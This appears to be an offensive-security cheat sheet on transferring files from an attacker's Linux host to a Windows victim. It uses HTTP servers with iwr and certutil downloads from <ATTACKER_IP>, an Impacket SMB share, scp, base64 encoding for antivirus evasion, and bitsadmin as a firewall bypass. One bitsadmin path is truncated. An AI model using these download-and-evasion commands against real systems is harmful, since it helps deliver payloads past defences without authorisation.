
## 1. The HTTP Method (Fast & Simple)

_Best for: Ad-hoc file downloads using basic tools._

### Attacker (Linux - Sender)

In attacker mechine we have to host http server

```
# Python 3
python3 -m http.server 80

# Or using PHP
php -S 0.0.0.0:80

# or using apache2
sudo systemctl satrt apache2
```

### Victim (Windows - Receiver)

 In Windows we don't need any extra software  
####  PowerShell(iwr):

```
 iwr -Uri http://<ATTACKER_IP>/filename -OutFile filename
```

####  CMD (certutil): 

```
certutil -urlcache -f http://<ATTACKER_IP>/filename filename
```
    
## 2. The SMB Method (Professional/Bulk)

_Best for: Large data transfers, full folders, and persistent access._

### Attacker (Linux - Sender)

Use `Impacket` library to host SMB server :

```
Install: sudo pip install impacket
```

```
impacket-smbserver myShare /path/to/folder -smb2support
```

### Victim (Windows - Receiver)

We can access it with CMD and file explorer :


```
# Map the shared folder as a drive
net use Z: \\<ATTACKER_IP>\myShare
```

## 3. The SCP/SFTP Method (Secure)

_Best for: When Windows has an SSH server (OpenSSH) running._

### Attacker (Linux - Sender)


```
scp /path/to/local/file username@<WINDOWS_IP>:C:\Users\Username\Desktop\
```

## 4. Evasion & Advanced Techniques

_Best for: When standard methods are blocked by Antivirus or Firewall._

### A. Base64 Encoding (Evasion)

When the file is transfered but corrupted in that case AV blocks the file . In this case we use encoding :

- **Linux:** 
```
   base64 -w 0 file.exe > file.b64
```

- **Windows (Decode):** 
```
certutil -decode file.b64 file.exe
```
 

### B. BITSAdmin (Firewall Bypass)

`This utility utilizes a background service, which often allows it to successfully bypass firewall restrictions.`

### Attacker (Linux - Sender)

In attacker mechine we have to host http server

```
# Python 3
python3 -m http.server 80

# Or using PHP
php -S 0.0.0.0:80

# or using apache2
sudo systemctl satrt apache2
```
#### Victim (Windows - Receiver)

### CMD
```
bitsadmin /transfer "JobName" /download /priority normal http://<ATTACKER_IP>/file.exe C:\U
```

### powershell 

```
Start-BitsTransfer -Source http://<ATTACKER_IP>/file.exe -Destination C:\Users\Public\file.exe
```